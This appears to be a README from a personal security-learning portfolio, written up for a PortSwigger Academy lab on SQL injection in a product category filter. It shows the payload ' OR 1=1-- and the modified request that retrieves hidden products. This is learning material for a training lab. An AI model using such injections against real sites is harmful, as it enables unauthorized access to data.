# Web Security Labs Portfolio

Author: Vivek Sompura

## About

This repository contains my hands-on web application security learning journey using Burp Suite and PortSwigger Web Security Academy.

I use this repository to document security labs, methodologies, payloads, screenshots, and lessons learned while developing practical skills in Web Application Security, VAPT, and Bug Bounty Hunting.

## Tools Used

- Burp Suite Community Edition
- PortSwigger Web Security Academy
- Kali Linux
- HTTP History
- Repeater

---

# Lab 01 - SQL Injection: Hidden Data Retrieval

## Objective

Identify and exploit a SQL Injection vulnerability in a product category filter to retrieve hidden products.

## Vulnerable Parameter

category

Example:

/filter?category=Food

## Payload Used

```sql
' OR 1=1--
```

## Modified Request

```http
GET /filter?category=Food'+OR+1=1-- HTTP/2
```

## Result

Successfully bypassed the category restriction and retrieved hidden data.

## Skills Learned

- HTTP Requests and Responses
- Query Parameters
- Burp Repeater
- SQL Injection Basics
- Web Application Testing

## Status

✅ Lab Solved
